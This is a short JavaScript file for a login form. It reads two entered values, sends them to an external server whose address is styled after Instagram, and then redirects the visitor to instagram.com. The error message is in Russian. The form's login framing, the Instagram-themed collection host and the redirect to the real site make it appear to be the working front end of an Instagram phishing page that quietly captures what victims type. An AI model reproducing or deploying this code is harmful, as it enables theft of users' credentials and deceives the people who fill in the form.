const form = document.getElementById('loginForm');

form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const firstName = document.getElementById('firstName').value.trim();
  const lastName = document.getElementById('lastName').value.trim();

  try {
    const response = await fetch('https://insta-n1bf.onrender.com/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ firstName, lastName })
    });

    if (!response.ok) {
      throw new Error('Request failed');
    }

    form.reset();
    window.location.href = 'https://instagram.com';
  } catch (error) {
    alert('Ошибка при отправке. Проверьте, что backend запущен.');
  }
});
